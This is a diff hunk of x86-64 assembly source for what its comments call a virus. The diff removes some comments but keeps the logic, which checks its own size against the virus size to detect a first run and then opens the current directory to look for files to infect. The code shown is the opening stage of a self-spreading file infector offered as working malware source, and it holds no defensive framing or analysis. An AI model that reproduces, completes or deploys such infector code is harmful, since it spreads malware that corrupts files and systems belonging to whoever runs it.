@@ -35,33 +35,33 @@ v_start:
     mov r14, [rsp + 8]                                          ; saving argv0 to r14
     push rdx
     push rsp
-    sub rsp, 5000                                               ; reserving 5000 bytes
-    mov r15, rsp                                                ; r15 has the reserved stack buffer address
+    sub rsp, 5000                                               
+    mov r15, rsp                                                
 
     check_first_run:
         mov rdi,  r14                                           ; argv0 to rdi
         mov rsi, O_RDONLY
         xor rdx, rdx                                            ; not using any flags
         mov rax, SYS_OPEN
-        syscall                                                 ; rax contains the argv0 fd
+        syscall                                                 
 
         mov rdi, rax
-        mov rsi, r15                                            ; rsi = r15 = stack buffer address
+        mov rsi, r15                                            
         mov rax, SYS_FSTAT                                      ; getting argv0 size in bytes
-        syscall                                                 ; stat.st_size = [r15 + 48]
+        syscall                                                 
         
         cmp qword [r15 + 48], V_SIZE                            ; compare argv0 size with virus size
         jg load_dir                                             ; if greater, not first run, continue infecting without setting control flag
         
-        mov byte [r15 + 3000], FIRST_RUN                        ; set the control flag to [r15 + 3000] to represent virus first execution, not a great approach but will do for now
+        mov byte [r15 + 3000], FIRST_RUN                        
 
     load_dir:
-        push "."                                                ; pushing "." to stack (rsp)
-        mov rdi, rsp                                            ; moving "." to rdi
+        push "."                                                
+        mov rdi, rsp                                            
         mov rsi, O_RDONLY
         xor rdx, rdx                                            ; not using any flags
         mov rax, SYS_OPEN
-        syscall                                                 ; rax contains the fd
+        syscall                                                 
         
         pop rdi
         cmp rax, 0                                              ; if can't open file, exit now
